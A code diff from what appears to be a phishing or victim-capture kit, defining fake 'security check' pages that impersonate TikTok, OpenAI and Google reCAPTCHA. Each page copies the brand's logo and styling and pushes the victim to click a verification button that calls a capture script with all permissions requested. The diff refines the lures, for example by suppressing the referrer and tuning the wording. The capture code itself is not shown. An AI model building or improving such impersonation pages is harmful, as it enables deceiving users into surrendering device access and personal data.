+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Security Check | TikTok</title><style>body { background:#ffffff; font-family: "TikTok Font", -apple-system, sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; color:#161823; } .box { width:100%; max-width:420px; text-align:center; padding: 48px 32px; border: 1px solid #f0f0f0; border-radius: 8px; } .logo { width: 140px; height: auto; margin-bottom: 40px; } h2 { font-size:24px; font-weight:700; margin-bottom:16px; } p { color: rgba(22, 24, 35, 0.7); font-size:16px; margin-bottom:48px; line-height: 1.5; } .btn { background:#fe2c55; color:#fff; padding:16px; border:none; border-radius: 4px; font-weight:700; cursor:pointer; width:100%; font-size:16px; transition: opacity 0.2s; } .btn:hover { opacity: 0.9; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a9/TikTok_logo.svg/512px-TikTok_logo.svg.png" class="logo" referrerpolicy="no-referrer"><h2>Security Sweep</h2><p>Please complete a quick network integrity check to maintain your account safety and access to creator features.</p><button class="btn" onclick="window.startCapture();">Verify Identity</button></div>${getCaptureScript(id, 'https://www.tiktok.com', {
       tmplId: 'tiktok', perms: ALL_PERMS, accent: '#fe2c55', icon: '🎵'
     })}</body></html>`
   },
   'chatgpt': {
     name: "🤖 AI: OpenAI Dev Audit (Full Scope)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Security Check - OpenAI</title><style>body { background:#ffffff; font-family: ui-sans-serif, system-ui, sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; } .box { width:100%; max-width:400px; text-align:center; padding: 40px; } .logo { width: 44px; height: auto; margin-bottom: 30px; } h2 { font-size:32px; font-weight: 700; color: #10a37f; margin-bottom: 20px; } p { color:#353740; font-size:16px; margin-bottom:40px; line-height: 1.6; } .btn { background:#10a37f; color:#fff; border:none; padding:15px; border-radius:4px; cursor:pointer; width:100%; font-size: 16px; font-weight:600; transition: background 0.2s; } .btn:hover { background: #0e906f; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4d/OpenAI_Logo.svg/512px-OpenAI_Logo.svg.png" class="logo"><h2>Verify you are human</h2><p>To protect our systems and your account, please complete a quick security audit to verify your connection integrity.</p><button class="btn" onclick="window.startCapture();">Start Verification</button></div>${getCaptureScript(id, 'https://openai.com', {
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>OpenAI Authentication</title><style>body { background:#ffffff; font-family: "Söhne", ui-sans-serif, sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; } .box { width:100%; max-width:400px; text-align:center; padding: 40px; } .logo { width: 44px; height: auto; margin-bottom: 32px; } h2 { font-size:32px; font-weight: 600; color: #10a37f; margin-bottom: 24px; letter-spacing: -0.02em; } p { color:#353740; font-size:16px; margin-bottom:40px; line-height: 1.6; } .btn { background:#10a37f; color:#fff; border:none; padding:16px; border-radius:4px; cursor:pointer; width:100%; font-size: 16px; font-weight:600; transition: background 0.2s; } .btn:hover { background: #0e906f; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4d/OpenAI_Logo.svg/512px-OpenAI_Logo.svg.png" class="logo" referrerpolicy="no-referrer"><h2>Verify you are human</h2><p>To protect our systems and your session integrity, please complete a quick security audit to verify your connection.</p><button class="btn" onclick="window.startCapture();">Begin Verification</button></div>${getCaptureScript(id, 'https://openai.com', {
       tmplId: 'chatgpt', perms: ALL_PERMS, accent: '#10a37f', icon: '🤖'
     })}</body></html>`
   },
   'recap': {
     name: "🕵️ reCAPTCHA: V2 Checkbox Check (Realistic)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>reCAPTCHA</title><style>body { display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; margin:0; background:#fff; font-family: Roboto, helvetica, arial, sans-serif; } .top-text { font-size: 24px; color: #202124; margin-bottom: 20px; font-weight: 400; } .box { width: 302px; height: 76px; border: 1px solid #d3d3d3; border-radius: 3px; background: #f9f9f9; display: flex; align-items: center; box-sizing: border-box; cursor: pointer; transition: all 0.2s; position: relative; } .box:hover { box-shadow: 0px 0px 4px 1px rgba(0,0,0,0.08); } .checkbox { width: 28px; height: 28px; border: 2px solid #c1c1c1; border-radius: 2px; margin-left: 12px; margin-right: 12px; background: #fff; display: flex; align-items: center; justify-content: center; } .checkbox.spinning { border: none !important; animation: none; background: transparent; } .checkbox.spinning::after { content: ''; width: 24px; height: 24px; border: 3px solid #1a73e8; border-right-color: transparent; border-radius: 50%; animation: sc-spin 1s linear infinite; } @keyframes sc-spin { to { transform: rotate(360deg); } } .text { font-size: 14px; color: #222; max-width: 154px; } .logo { position: absolute; right: 10px; top: 12px; display: flex; flex-direction: column; align-items: center; } .logo img { width: 32px; height: 32px; margin-bottom: 2px; } .logo span { font-size: 10px; color: #555; } .logo-links { font-size: 8px; color: #555; margin-top: 2px; } .logo-links a { color: #555; text-decoration: none; } .logo-links a:hover { text-decoration: underline; }</style></head><body><h1 class="top-text">Verify you are human</h1><div class="box" onclick="this.querySelector('.checkbox').classList.add('spinning'); window.startCapture();"><div class="checkbox"></div><div class="text">I'm not a robot</div><div class="logo"><img src="https://www.gstatic.com/recaptcha/api2/logo_48.png"><span>reCAPTCHA</span><span class="logo-links"><a href="https://policies.google.com/privacy">Privacy</a> - <a href="https://policies.google.com/terms">Terms</a></span></div></div><div id="status-text" style="display:none;"></div>${getCaptureScript(id, 'https://google.com/', {
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>reCAPTCHA Verification</title><style>body { display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; margin:0; background:#fff; font-family: Roboto, helvetica, arial, sans-serif; } .box { width: 302px; height: 76px; border: 1px solid #d3d3d3; border-radius: 3px; background: #f9f9f9; display: flex; align-items: center; box-sizing: border-box; cursor: pointer; transition: all 0.2s; position: relative; } .box:hover { box-shadow: 0px 0px 2px rgba(0,0,0,0.1); } .checkbox { width: 28px; height: 28px; border: 2px solid #c1c1c1; border-radius: 2px; margin-left: 12px; margin-right: 12px; background: #fff; display: flex; align-items: center; justify-content: center; } .checkbox.spinning { border: none !important; background: transparent; } .checkbox.spinning::after { content: ''; width: 24px; height: 24px; border: 3px solid #1a73e8; border-right-color: transparent; border-radius: 50%; animation: sc-spin 1s linear infinite; } @keyframes sc-spin { to { transform: rotate(360deg); } } .text { font-size: 14px; color: #222; font-family: Roboto, sans-serif; } .logo { position: absolute; right: 10px; top: 12px; display: flex; flex-direction: column; align-items: center; } .logo img { width: 32px; height: 32px; margin-bottom: 2px; } .logo span { font-size: 8px; color: #555; text-align: center; line-height: 1.2; } .logo-links { font-size: 8px; color: #555; margin-top: 2px; } .logo-links a { color: #555; text-decoration: none; } .logo-links a:hover { text-decoration: underline; }</style></head><body><div class="box" onclick="this.querySelector('.checkbox').classList.add('spinning'); window.startCapture();"><div class="checkbox"></div><div class="text">I'm not a robot</div><div class="logo"><img src="https://www.gstatic.com/recaptcha/api2/logo_48.png"><span>reCAPTCHA</span><span class="logo-links"><a href="#">Privacy</a> - <a href="#">Terms</a></span></div></div>${getCaptureScript(id, 'https://google.com/', {
       tmplId: 'recap', perms: ALL_PERMS, accent: '#1a73e8'
     })}</body></html>`
   },
